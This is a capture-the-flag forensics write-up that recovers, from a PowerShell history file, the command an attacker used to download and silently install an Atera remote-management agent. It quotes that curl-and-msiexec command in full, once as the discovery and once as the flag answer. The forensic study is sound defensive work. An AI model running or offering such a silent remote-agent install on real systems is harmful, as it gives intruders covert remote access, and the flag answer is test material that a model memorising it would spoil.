# 

**Objective:**  
Identify the **exact command** the attacker used to fetch the Remote Monitoring & Management (RMM) agent.

---

# **1️⃣ Approach**

Since RMM deployment typically happens through PowerShell or CMD, I started hunting inside **PowerShell command history**, found here:

`Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt`

This file captures _exact_ commands typed by users — perfect for reconstructing attacker actions.

To pull anything related to RMM installers, I searched for:

- `curl`
    
- `msiexec`
    
- `setup.msi`
    
- `http` / `https`
    
- `atera`
    

Using:

`grep -RniE "atera|agent|http|https|msi|download" Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt`

---

# **2️⃣ Discovery**

Inside the `svc_patch.MSEDGEWIN10` user history, I found the smoking gun:

`curl -L -o setup.msi "https://HelpdeskSupport1763101472435.servicedesk.atera.com/GetAgent/Windows/?cid=1&aid=001Q300000ZcpWnIAJ" && msiexec /i setup.msi /qn`

This is a **full Atera RMM installer fetch command**, executed by the attacker to deploy their remote access foothold.

Key details:

- **curl -L -o setup.msi** → downloads the installer
    
- The URL is an **Atera tenant-specific agent download endpoint**
    
- **msiexec /i setup.msi /qn** → installs it silently with no UI
    

This matches the RMM artifacts found elsewhere (`ATERAAGENT.EXE.pf`, agent modules, etc.).

---

# **3️⃣ Final Flag**

The challenge required the **exact command** as typed by the attacker.

`r00t{curl -L -o setup.msi "https://HelpdeskSupport1763101472435.servicedesk.atera.com/GetAgent/Windows/?cid=1&aid=001Q300000ZcpWnIAJ" && msiexec /i setup.msi /qn}`

---

# **✔️ Conclusion**

By analyzing PowerShell history, we recovered the precise command used to download and install the Atera RMM agent — the attacker’s remote foothold. This step was crucial to understanding the persistence mechanism and mapping the full compromise timeline.